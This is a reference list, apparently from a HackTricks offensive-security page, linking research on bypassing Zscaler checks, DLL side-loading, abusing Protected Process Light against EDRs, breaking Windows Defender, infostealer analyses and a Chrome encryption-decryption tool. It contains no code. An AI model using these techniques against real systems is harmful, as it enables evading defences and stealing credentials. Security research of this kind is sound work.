- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
